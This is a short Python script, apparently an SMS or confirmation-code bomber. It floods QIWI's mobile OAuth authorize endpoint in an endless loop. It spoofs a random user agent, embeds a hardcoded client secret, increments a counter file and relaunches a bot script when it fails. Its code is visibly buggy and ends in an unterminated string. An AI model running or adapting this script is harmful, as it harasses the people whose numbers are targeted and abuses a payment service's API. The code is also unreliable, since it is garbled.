try:
    import  requests, fake_useragent, os
    user = fake_useragent.UserAgent().random
    headers = {'user_agent': user}
    
    
    while True:
        UsersId = open("baza.txt", "r")
        UsersId2 = set()
        for line in UsersId:
            UsersId2.add(line.strip())
        UsersId.close()
        with open("baza.txt", "r") as baa2:
            baal2 = baa2.read()
            baal2 = int(baal2)
    
        a = open("baza.txt", "w")
        a.write(str(int(baal2) + int(1)))
        a.close()
        suser = []
        for user in UsersId2:
            suser.append(str(user))
        requests.post("https://mobile-api.qiwi.com/oauth/authorize", headers=headers,
                                      data={
                                          "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                                          "username": user,
                                          "client_id": "android-qw",
                                          "client_secret": "zAm4FKq9UnSe7id",
                                      })
        print(user)
except:
    os.system('python bot.py
